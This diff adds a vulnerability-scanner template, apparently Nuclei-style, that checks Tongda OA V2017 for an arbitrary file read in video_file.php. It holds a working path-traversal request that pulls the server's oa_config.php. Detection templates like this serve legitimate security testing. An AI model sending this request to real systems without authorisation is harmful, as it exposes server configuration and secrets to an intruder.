@@ -1,0 +1,24 @@
+id: tongda-video-file-read
+brief:
+    title: Tongda OA V2017 Video File - Arbitrary File Read
+    by: SleepingBag945
+    level: medium
+    about: There is an arbitrary file reading vulnerability in Extreme OA video_file.php. An attacker can obtain sensitive files on the server through the vulnerability.
+    label:
+        - tongda
+        - lfi
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php'
+      signs:
+        - "on": word
+          has:
+            - $ROOT_PATH
+            - $ATTACH_PATH
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
